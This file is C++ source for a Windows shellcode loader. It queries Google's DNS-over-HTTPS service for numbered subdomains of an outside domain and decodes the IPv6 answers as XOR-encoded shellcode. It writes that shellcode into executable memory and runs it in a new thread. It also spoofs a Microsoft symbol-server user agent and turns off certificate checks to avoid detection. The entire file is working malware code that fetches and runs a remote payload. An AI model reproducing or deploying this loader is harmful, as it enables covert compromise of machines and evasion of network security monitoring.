#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <WinInet.h>
#include <stdio.h>
#include <iostream>
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <nlohmann/json.hpp>

#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "Ws2_32.lib")

#define HTTP_USER_AGENT     "Microsoft-Symbol-Server/10.1710.0.0"
#define DOMAIN              "dns.google.com"
#define HTTP_POST_PAGE       "/resolve?name=test.com"
#define CALLBACK_PORT       443

HINTERNET hConnection;

using json = nlohmann::json;

typedef LONG (NTAPI* pRtlIpv6StringToAddressA)(
	  PCSTR    S,
	 PCSTR* Terminator,
	 in6_addr* Addr
	);


HINTERNET PrepareCallback()
{
	DWORD timeout = 15;
	LPCSTR HTTP_UserAgent = HTTP_USER_AGENT;
	LPCSTR domain = DOMAIN;
	DWORD CallbackPort = CALLBACK_PORT;
	HINTERNET hConnection = NULL;

	//if (!InternetSetOptionA(NULL, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout)));
	//return NULL;

	HANDLE hInternet = InternetOpenA(HTTP_UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (!hInternet || hInternet == INVALID_HANDLE_VALUE)
		return NULL;

	hConnection = InternetConnectA(hInternet, domain, CallbackPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (!hConnection || hConnection == INVALID_HANDLE_VALUE)
		return NULL;

	return hConnection;
}

json ResolveViaDoH(HINTERNET hConnection, LPSTR data)
{
	HINTERNET hRequest;
	DWORD reqFlags = 0;
	DWORD dwBuffLen = sizeof(reqFlags);

	DWORD sizeOfURL = strlen(HTTP_POST_PAGE) * 2 + strlen(data) + 1;
	LPSTR url = (LPSTR)malloc(sizeOfURL);
	sprintf_s(url, sizeOfURL, "/resolve?name=%s&type=aaaa", data);

	DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_SECURE;
	hRequest = HttpOpenRequestA(hConnection, "GET", url, NULL, NULL, NULL, flags, 0);

	if (hRequest == INVALID_HANDLE_VALUE)
		return FALSE;

	InternetQueryOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, (LPVOID)&reqFlags, &dwBuffLen);
	reqFlags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION;
	InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &reqFlags, sizeof(reqFlags));

	if (!HttpSendRequestA(hRequest, NULL, 0, NULL, 0))
	{
		printf("HttpSendRequest error : (%lu)\n", GetLastError());
		return FALSE;
	}

	DWORD dwContentLen = 10000;
	char* pData = (char*)GlobalAlloc(GMEM_FIXED, dwContentLen + 1);

	DWORD dwBufLen = sizeof(dwContentLen);
	if(true)
	//if (HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, (LPVOID)&dwContentLen, &dwBufLen, 0))
	{
		DWORD dwReadSize = 200;   // We will read 10% of data
											// with each read.

		DWORD cReadCount;
		DWORD dwBytesRead;
		DWORD lastGoodByte = 0;
		char* pCopyPtr = pData;
		for (cReadCount = 0; cReadCount < 10; cReadCount++)
		{
			bool res = InternetReadFile(hRequest, pCopyPtr, dwReadSize, &dwBytesRead);
			pCopyPtr = pCopyPtr + dwBytesRead;
			if (dwBytesRead == 0)
				break;
			else
				lastGoodByte += dwBytesRead;
		}		
		// Null terminate data
		pData[lastGoodByte] = 0;

		
	}
	json j = json::parse(pData);

	InternetCloseHandle(hRequest);

	return j;

}


void hexdump(void* ptr, int buflen) {
	unsigned char* buf = (unsigned char*)ptr;
	int i, j;
	for (i = 0; i < buflen; i += 16) {
		printf("%06x: ", i);
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%02x ", buf[i + j]);
			else
				printf("   ");
		printf(" ");
		for (j = 0; j < 16; j++)
			if (i + j < buflen)
				printf("%c", isprint(buf[i + j]) ? buf[i + j] : '.');
		printf("\n");
	}
}

BOOL ResolveDNSHostname(char* hostname, LPVOID ret)
{

	if (hConnection == NULL)
	{
		return FALSE;
	}

	json result = ResolveViaDoH(hConnection, (LPSTR)hostname);

	if (result.contains("Answer"))
	{
		// not so pretty way of converting std::string to a char array
		std::string answer = result["Answer"][0]["data"].get<std::string>();
		int len = answer.size();
		char* c = new char[len + 1];
		std::copy(answer.begin(), answer.end(), c);
		c[len] = '\0';

		in6_addr Ipv6address;
		PCSTR out;

		pRtlIpv6StringToAddressA RtlIpv6StringToAddressA = (pRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlIpv6StringToAddressA");

		RtlIpv6StringToAddressA(c, &out, &Ipv6address);


		memcpy(ret, Ipv6address.u.Word, sizeof(Ipv6address.u.Word));
		return TRUE;
	}
	else {
		// answer not found
		return FALSE;
	}
}

int main()
{
	char* domain = (char*)malloc(200);
	int i = 0;
	int z;
	z = 0;
	char xorKey = 0x10;

	LPVOID allbuffer2 = VirtualAlloc(NULL, 0x4000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	void* initialCode = allbuffer2;

	hConnection = PrepareCallback();

	while (true)
	{
		sprintf_s(domain, 200, "emperor%i.p.pacc.tortellozzi.club", i);
		LPVOID result = malloc(16);
		//memset(result, 0, 16);

		// resolve the domain via DoH
		bool wasResolved = ResolveDNSHostname(domain, result);

		if (!wasResolved)
			break;
		//hexdump(result, 16);
		// Write the shellcode bytes from Ipv6Address to the memory
	
		int x;

		for (x = 0; x < 16; x++) {

			// Copy each byte from shellcode to TempByte after decoding it
			// In case there is no XOR encoding it will XOR to 0x00 which
			char TempByte = *((char*)result + x)^ xorKey;

			// Copy the shellcode chunck to the previously allocated space.
			memcpy((char*)allbuffer2 + z, &TempByte, 1);

			// Make sure to append to the next memory address inside the allocated space.
			z++;

		}

		free(result);

		// sleep 
		Sleep(100);
		i++;
	}
	
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allbuffer2, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
}